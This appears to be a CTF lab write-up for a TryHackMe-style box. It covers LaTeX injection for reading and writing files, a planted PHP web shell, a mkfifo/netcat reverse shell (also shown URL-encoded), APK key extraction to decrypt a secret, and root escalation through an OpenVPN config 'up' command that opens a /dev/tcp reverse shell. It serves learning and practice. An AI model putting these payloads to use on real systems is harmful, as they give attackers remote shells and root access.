# LaxCTF

"Try Harder!"

This one was tough, but fun. I learnt a lot more than I would like about latex. 

While the first stage - getting a shell on the box, was very exploratory and fun, the second stage got a weee bit CTF-like, with props like secret values encoded using keys buried in unrealistic APKs and an exploitable connection to TryHackMe etc. 

Ah well, learned a bit, and all the time wasted enumerating certainly taught me a lot about enumerating :D However, I would hope OSCP is a little more real-world than this.

That being said, a *different* lesson might be that, when attacking a crafted environment, anything out of the ordinary is worth deep investigation. Here I had looked at the APK and discarded it, and the ovpn file but thought it was nothing since it was empty (I looked at it for creds). A deeper, or different look, would have carried me through.

## Process

First, only 22 and 80 are open. 80 reveals a 'TexMaker' website, where you can enter LaTeX script and have it compiled into a PDF for you.

I immediately investigated reading files into the output (LFI) and executing shell commands through LaTeX. 

> The docs, by the way, for LaTeX are truly hideous - how has it survived and thrived for so long with such shit documentation?

I found this blog: https://0day.work/hacking-with-latex/. It shows several LaTeX abuse techniques, and over the next six hours or so I experimented with them:

- First, shell execution is right out (as far as I can tell). The common commands `immediate`, `write18` or `input|` were all blocked. Even the `\def` trick the blog specifies at the end didn't result in any code execution, so I assumed all shell escapes were turned off (later confirmed).

- Second, I could read files anywhere. I read `\etc\passwd` but it failed, likely due to latex interpreting `_` as a command character and the system having at least one user like `_apt`; I could do partial extraction via not looping but just going line by line, however I eventually found a better technique: rather than using `\text` to emit the line to the generated PDF, if I used `\typeout` I could write to the compile log which is printed on the page:

    ```
    \newread\file
    \openin\file=/etc/passwd
    \loop\unless\ifeof\file
        \read\file to\fileline 
        \typeout{\fileline}
    \repeat
    \closein\file
    ```

- Third, writing anywhere didn't work. I could write files with no path, so local, but I didn't know where that directory was and so couldn't emit a shell or anything.

With no shell commands, I figured my best bet was going to be adding some PHP to the website somewhere. I knew it was PHP because `dirb` revealed a 200 code for `config.php` (it also revealed a few listable directories, like where the pdf's go).

Using my `typeout` technique, I was able to fully read `/etc/passwd` and found an entry for `/home/king`. Guessing the user flag would be `user.txt`, I successfully read it using the same technique.

At this point, my chief focus was finding where the web directory was. I tried lots of things, even trying to guess various `/var/www/` paths, to no avail. Finally, via this blog https://highon.coffee/blog/lfi-cheat-sheet/, I found out about `/proc/self/environ`. Reading that partially failed, but I got enough of the content to reveal the `OLDPWD` of the current user was `/var/www/html/Latex`. Boom!

Reading `config.php` revealed the existence of a `/compile` path. I had tried writing files to `/pdf` and `/assets` but they hadn't worked. Writing a `.php` to `/var/www/html/Latest/compile/test.php` did work though, and I was able to browse to it! I promptly used the following to create a simple PHP web shell:

    \newwrite\outfile
    \openout\outfile=shell.php
    \write\outfile{<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>}
    \closeout\outfile

    some random text to ensure pdf is created

Going to `/compile/shell.php?cmd=whoami` got that magic `www-data`. To get a reverse shell I used this script:

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.178.75 4444 >/tmp/f

Though since it had to be in the query string, I first encoded it to url with Burp:

    %72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%37%38%2e%37%35%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66

Once on the machine, I tried `sudo -l` and `find / -user root -perm -u=s` without success. I checked out that suspicious entry from the bottom of `/etc/passwd`: `/opt/secret`, and found a file readable and executable by everyone that looked to be (via its first line) a aes/cbc/128 encoded file. I've saved it here as [laxctf.secret](./laxctf.secret).

I spent another huge amount of time (~4 hours) enumerating. I found a apk file under the website, but after running it through strings and decoding it via unzip it didn't seem to contain anything. I also found a script owned by `king` called `cleanpdfdir.sh`, but adding a test `echo "cat /etc/passwd > passwd.txt" >> cleanpdfdir.sh` didn't produce results.

Eventually I gave up, and went for some help. This directed me straight back to the apk, and a tool I was unaware of: apktool: https://ibotpeaches.github.io/Apktool/documentation/

I used this to decode the apk, and while crawling through its files, I found in `smali/com/example/a11x256/frida_test/my_activity.smali` code like the following:

    .prologue
    .line 90
    :try_start_0
    const-string v3, "sUp3rCr3tKEforL!"

    .line 91
    .local v3, "pre_shared_key":Ljava/lang/String;
    const-string v1, "sUp3rCr3tIVforL!"

    .line 92
    .local v1, "generated_iv":Ljava/lang/String;
    const-string v5, "AES/CBC/128"

Using that via an [online AES decoder](https://www.devglan.com/online-tools/aes-encryption-decryption) I got the following a huge brainfuck script (easily determined via its syntax: `----[---->+<]>--.+[--->+<]>+.[--->+<]>+.[->+++++` etc.). Running that through [a brainfuck interpreter](https://www.dcode.fr/brainfuck-language) gave me what looked a bit like base64. Running *that* through [cyberchef](https://gchq.github.io/CyberChef) didn't decode, however. 

But, one thing I noticed, was that the supposed base64 started with `=`; normally base64, if it has these, adds them at the end as padding. 

A bit of experimenting revealed the solution: reverse -> from base64 * 16 (yes, decode from base64 16 times) which finally gave: 

    king:tryh@ckm3w4sH3r3

After this, ssh'ing onto the box as King, even moar enumeration. The PATH variable looked suspicious, along with root's cronjob that ran `bash run.sh`. I tried replacing bash via exploiting the fact that PATH appeared to include king's home directory subfolders, but that didn't work.

More help pointed me to a suspicious file in /home that I had previous ignored as some sort of weird artefact: one thing about this room is that its a bit CTF-ey, not real worldey, if that makes sense. Basically there is an tryhackme.ovpn file in the home dir, and its being run by run on a shedule, likely as part of the `run.sh` the cronjob is invoking.

Well, there is an exploit via ovpn files: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da

I replaced the ovpn's content with:

    remote 3.104.196.208:1194
    dev null
    script-security 2
    up "/bin/bash -c '/bin/bash -i > /dev/tcp/10.10.162.148/4444 0<&1 2>&1&'"

With the first IP Port above being the IP Port I use when connecting to TryHackMe (just there to make the connection valid), and the second IP Port being my attacker machine, where I set up a nc listener.

A root shell popped momentarily. A bit silly, really.